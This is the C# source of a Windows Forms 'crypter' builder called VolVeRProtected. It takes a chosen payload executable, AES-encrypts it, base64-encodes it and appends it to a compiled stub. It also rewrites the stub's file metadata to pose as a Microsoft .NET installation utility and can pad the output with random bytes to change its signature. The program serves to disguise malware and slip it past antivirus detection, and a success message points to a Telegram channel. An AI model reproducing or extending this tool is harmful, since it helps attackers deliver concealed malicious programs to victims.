using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VolVeRProtected
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.FormBorderStyle = FormBorderStyle.None;
            this.MouseDown += new MouseEventHandler(Form1_MouseDown);
        }

        private void exitBox_Click(object sender, EventArgs e)
        {

            Application.Exit();
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }
        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();
        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private extern static void SendMessage(System.IntPtr hWnd, int wMsg, int wParam, int lParam);

        private void paneltitle(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, 0x112, 0xf012, 0);
        }

        void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            base.Capture = false;
            Message m = Message.Create(base.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref m);
        }
        private void panel1_Paint(object sender, PaintEventArgs e)
        {
 

        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void browsePayloadBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog open = new OpenFileDialog();
            open.Filter = "Server.exe |*.exe";
            if (open.ShowDialog() == DialogResult.OK)
            {
                payloadTxt.Text = open.FileName;
            }
        }

        private void payloadTxt_TextChanged(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog open = new OpenFileDialog();
            open.Filter = "Server.exe |*.exe";
            if (open.ShowDialog() == DialogResult.OK)
            {
                payloadTxt.Text = open.FileName;
            }

        }
        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void button2_Click(object sender, EventArgs e)
        {
 
            CompilerParameters Params = new CompilerParameters();
            Params.GenerateExecutable = true;
            Params.ReferencedAssemblies.Add("System.dll");
            Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Params.ReferencedAssemblies.Add("System.Core.dll");
            Params.ReferencedAssemblies.Add("System.IO.Compression.dll");
            Params.ReferencedAssemblies.Add("System.Management.dll");
            Params.CompilerOptions = "/unsafe";
            Params.CompilerOptions += "\n/t:winexe";
            Params.OutputAssembly = "Stub.exe";

            string Source = Properties.Resources.Program;
            string Source2 = Properties.Resources.Class1;
            string Source3 = Properties.Resources.Class2;
            string Source4 = Properties.Resources.Class3_____________________;
            string Source5 = Properties.Resources.Class343343343434;
            string Source6 = Properties.Resources.Class4_____________________________________;
            string Source7 = Properties.Resources.Class4645445;
            string Source8 = Properties.Resources.Class5__;
            string Source9 = Properties.Resources.Class6____;
            string Source10 = Properties.Resources.Class7_________________________________________________________________;
            string Source11 = Properties.Resources.Class7542;
            string Source12 = Properties.Resources.Class8;
            string Source13 = Properties.Resources.VolVeR____________________________________________1;
            string Source14 = Properties.Resources.VolVeR;

            if (checkBox3.Checked == true)
            {
                Source = Source.Replace("uadihadhuwuhdsa", "true");
            }

            if (textBox1.Text == "")
            {
               
            }
            else
            {
                Source = Source.Replace("Installation Utility", textBox1.Text);
            }
            if (textBox3.Text == "")
            {

            }
            else
            {
                Source = Source.Replace("Microsoft .NET Services Installation Utility", textBox3.Text);
            }
            if (textBox4.Text == "")
            {

            }
            else
            {
                Source = Source.Replace("Microsoft® .NET Framework", textBox4.Text);
            }
            if (textBox5.Text == "")
            {

            }
            else
            {
                Source = Source.Replace("Microsoft Corporation", textBox5.Text);
            }
            if (textBox6.Text == "")
            {

            }
            else
            {
                Source = Source.Replace("© Microsoft Corporation.  All rights reserved.", textBox6.Text);
            }
            if (textBox1.Text == "")
            {

            }
            else
            {
                Source = Source.Replace("qidiqwusadu", "true");
                Source = Source.Replace("http", textBox1.Text);
            }


            var settings = new Dictionary<string, string>();
            settings.Add("CompilerVersion", "v4.0");
 
                CompilerResults Results2 = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source13, Source14, Source12, Source9, Source8, Source7, Source10, Source11, Source6, Source5, Source4, Source3, Source2, Source.ToString());
         
 
                CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Source.ToString());
            
              
          
            string filename = payloadTxt.Text; 

            byte[] stub = File.ReadAllBytes(Params.OutputAssembly = "Stub.exe");



            string key = Path.GetRandomFileName().Split('.')[0];

            byte[] encrypted = AES_Encrypt(File.ReadAllBytes(filename), key); 

            byte[] base64 = Encoding.UTF8.GetBytes(Convert.ToBase64String(encrypted)); 

            FileStream fs = new FileStream("Crypted.exe", FileMode.CreateNew, FileAccess.Write);
            fs.Write(stub, 0, stub.Length);
            fs.Write(Encoding.UTF8.GetBytes("chartets"), 0, Encoding.UTF8.GetBytes("chartets").Length);
            fs.Write(Encoding.UTF8.GetBytes(key), 0, Encoding.UTF8.GetBytes(key).Length);
            fs.Write(Encoding.UTF8.GetBytes("chartets"), 0, Encoding.UTF8.GetBytes("chartets").Length);
            fs.Write(base64, 0, base64.Length);
             
            if (checkBox2.Checked == true)
            {
                 
                var random = new Random(23131);
                var testData = new byte[20];
                random.NextBytes(testData);
                fs.Write(testData, 0, testData.Length);

            }
            fs.Close();



            if (Results.Errors.Count > 0)
            {
                if (checkBox4.Checked == true)
                {
                    foreach (CompilerError err in Results2.Errors)
                        MessageBox.Show(err.ToString(), "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Information); //Выводим циклом ошибки, если они есть
                }
                else if (checkBox4.Checked == false)
                {
                    foreach (CompilerError err in Results.Errors)
                        MessageBox.Show(err.ToString(), "Ошибка!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }


            }
            else
            {
                MessageBox.Show("Готово, https://t.me/VolVeRFM");  
            }
        }
        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, string passwordBytes)
        {
            byte[] encryptedBytes = null;

 
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 5, 4, 6, 3, 3, 2, 1, 2, 3, 4, 10, 15, 18, 20 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

    }
}
